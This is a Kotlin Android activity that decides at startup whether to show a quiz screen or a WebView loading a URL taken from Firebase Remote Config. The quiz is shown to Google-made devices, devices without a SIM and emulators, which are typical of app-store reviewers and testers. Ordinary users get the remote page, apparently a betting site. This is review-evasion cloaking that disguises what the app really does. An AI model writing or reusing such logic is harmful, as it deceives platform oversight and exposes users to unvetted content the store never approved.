package earsline.teea

import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.lifecycle.lifecycleScope
import com.euzhene.webviewdemo.getUrlFromDataStore
import com.euzhene.webviewdemo.saveUrl
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.get
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import earsline.teea.ui.theme.WinlineTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await


class MainActivity : ComponentActivity() {
    private val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig

    private var shouldLaunchPlug by mutableStateOf(false)
    private var shouldLaunchWebView by mutableStateOf(false)
    private var shouldShowLoading by mutableStateOf(true)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        lifecycleScope.launch(Dispatchers.IO) {
            val url = getUrlFromDataStore(this@MainActivity)
            if (url == null) {
                val configSettings = remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 3600
                }
                remoteConfig.setConfigSettingsAsync(configSettings)
                remoteConfig.fetchAndActivate().await()

                val urlFromConfig = remoteConfig["url"].asString()
                if (
                    urlFromConfig.isEmpty() ||
                    Build.MANUFACTURER.lowercase().contains("google") ||
                    !containsSim(this@MainActivity)
                    || isEmulator()
                ) {
                    shouldLaunchPlug = true
                } else {
                    saveUrl(this@MainActivity, urlFromConfig)
                    shouldLaunchWebView = true
                }

            } else {
                shouldLaunchWebView = true
            }
            shouldShowLoading = false
        }

        setContent {
            WinlineTheme {
                if (shouldLaunchPlug) {
                    QuizScreen()
                }
                if (shouldLaunchWebView) {
                    WinWebView()
                }
                if (shouldShowLoading) {
                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        CircularProgressIndicator()
                    }
                }
            }
        }
    }
}

